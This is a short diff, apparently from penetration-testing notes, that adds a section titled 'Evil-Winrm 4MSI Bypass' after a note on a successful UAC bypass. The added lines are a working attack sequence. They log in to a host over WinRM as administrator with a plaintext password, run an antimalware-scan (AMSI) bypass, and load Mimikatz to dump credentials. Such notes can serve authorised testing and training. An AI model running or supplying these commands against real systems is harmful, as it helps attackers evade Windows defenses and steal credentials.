@@ -296,6 +296,11 @@ High
 The process our payload runs in has the integrity level High and therefore we have successfully bypassed UAC.
 ```
 
-
-
+## Evil-Winrm 4MSI Bypass
+```
+evil-winrm -i 192.168.1.19 -u administrator -p Riviera -s /opt/privsc/powershell
+Bypass-4MSI
+Invoke-Mimikatz.ps1
+Invoke-Mimikatz
+```
 
